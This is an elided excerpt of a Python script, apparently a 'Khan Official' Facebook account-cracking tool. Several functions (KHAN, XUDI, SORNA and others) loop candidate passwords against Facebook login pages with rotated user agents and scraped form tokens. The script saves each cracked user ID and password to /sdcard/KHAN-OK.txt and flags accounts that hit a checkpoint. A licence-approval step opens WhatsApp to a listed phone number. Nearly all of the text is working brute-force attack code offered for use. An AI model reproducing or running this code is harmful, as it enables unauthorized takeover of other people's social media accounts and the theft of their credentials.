#!/usr/bin/python
#The Credit For This Code Goes To Khan Official
...
print('')
print('')
print(' \033[38;5;46m Owner:Khan Official \n  Team:KhanBrother420')
try:
    import requests
...
def meyexudi():
  ...
  try:
    ...
    if id in httpCaht:
      ...
      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://wa.me/+8801738813664?text='+tks),approval()
      time.sleep(1)
      meyexudi()
  except:
    sys.exit()
...
def fuck():
    ...
    #print(' [✓] Ids saved in KHAN-OK.txt,-CP.txt')
    #print(balpakna)
...
def KHAN(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r \033[1;90m[\033[1;92mKHAN-M1\033[1;90m]-[\033[1;96m%s-%s\033[1;90m]-[\033[1;92mOK:%s\033[1;90m]\r'%(loop,tl,len(oks))),
            sys.stdout.flush()
           ...
           'x-response-format': 'JSONStream',
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print(f" \033[38;5;126m══════════════════════════════════════════════════\n \x1b[1;32m[KHAN-OK]\033[38;5;45m>\033[1;92m {cid} - {ps}          ")
                ...
                open('/sdcard/KHAN-OK.txt', 'a').write( cid+' | '+uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                #print(f" \x1b[1;30m[KHAN-💔] {uid} | {ps}   ")
                #print(f" \x1b[1;32m[NUMBAR-❤️‍🩹] {cid} - {ids} ")
...
def XUDI(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            max = random.choice(ugen)
            session = requests.Session()
            sys.stdout.write('\r \033[1;90m[\033[1;92mKHAN-M2\033[1;90m]-[\033[1;96m%s-%s\033[1;90m]-[\033[1;92mOK:%s\033[1;90m]\r'%(loop,tl,len(oks))),
            sys.stdout.flush()
            free_fb = session.get('https://p.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
...
def SORNA(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            max = random.choice(ugen)
            session = requests.Session()
            sys.stdout.write('\r \033[1;90m[\033[1;92mKHAN-M3\033[1;90m]-[\033[1;96m%s-%s\033[1;90m]-[\033[1;92mOK:%s\033[1;90m]\r'%(loop,tl,len(oks))),
            sys.stdout.flush()
...
def XXX(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            max = random.choice(ugen)
            session = requests.Session()
            sys.stdout.write('\r \033[1;90m[\033[1;92mKHAN-M4\033[1;90m]-[\033[1;96m%s-%s\033[1;90m]-[\033[1;92mOK:%s\033[1;90m]\r'%(loop,tl,len(oks))),
            sys.stdout.flush()
...
def SATTAR(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            max = random.choice(ugen)
            session = requests.Session()
            sys.stdout.write('\r \033[1;90m[\033[1;92mKHAN-M5\033[1;90m]-[\033[1;96m%s-%s\033[1;90m]-[\033[1;92mOK:%s\033[1;90m]\r'%(loop,tl,len(oks))),
            sys.stdout.flush()
...
def MUNNI(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            max = random.choice(ugen)
            session = requests.Session()
            sys.stdout.write('\r \033[1;90m[\033[1;92mKHAN-M6\033[1;90m]-[\033[1;96m%s-%s\033[1;90m]-[\033[1;92mOK:%s\033[1;90m]\r'%(loop,tl,len(oks))),
            sys.stdout.flush()
